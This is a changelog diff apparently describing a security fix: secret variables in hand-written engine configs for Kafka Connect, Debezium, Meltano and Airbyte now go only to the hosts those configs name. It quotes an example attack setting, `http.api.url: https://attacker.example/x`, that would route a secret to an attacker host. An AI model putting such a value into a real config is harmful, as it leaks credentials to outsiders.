@@ -257,7 +257,7 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   variable sent there; a host that is this machine needs no entry. The refusal names the variable
   and says that a project dotenv file supplied it, never the value.
 - **A variable in a hand-written engine config goes only to the hosts that config names
-  (acquisition builds).** `properties.kafka-connect.sink_connector_config`,
+  (acquisition builds).** `properties.kafka-connect.sink_connector_config` and `.iceberg_catalog_overrides`,
   `properties.debezium.server.sink.config`, `properties.debezium.extra_config`,
   `properties.meltano.target_config` and `properties.airbyte.destination_config` are pushed to the
   engine as written, and the pairing check read none of them: `http.api.url: https://attacker.example/x`
